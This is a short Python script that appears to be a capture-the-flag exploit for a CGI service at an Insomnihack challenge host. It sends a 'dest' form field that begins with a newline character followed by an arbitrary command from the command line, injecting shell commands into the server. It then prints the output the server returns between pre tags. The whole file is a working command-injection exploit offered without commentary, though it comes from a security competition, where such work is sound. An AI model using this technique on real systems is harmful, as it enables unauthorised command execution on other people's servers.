#!/usr/bin/python

import requests
import sys

URL = 'http://smartcat.insomnihack.ch/cgi-bin/index.cgi'

s = requests.Session()

payload = { 'dest' : chr(10) + sys.argv[1] }

r = s.post(URL, data=payload)

preparsing = False
for line in r.content.splitlines():
	if '</pre>' in line:
		preparsing = False

	if preparsing:
		print line

	if '<pre>' in line:
		print line.replace("<pre>","")
		preparsing = True





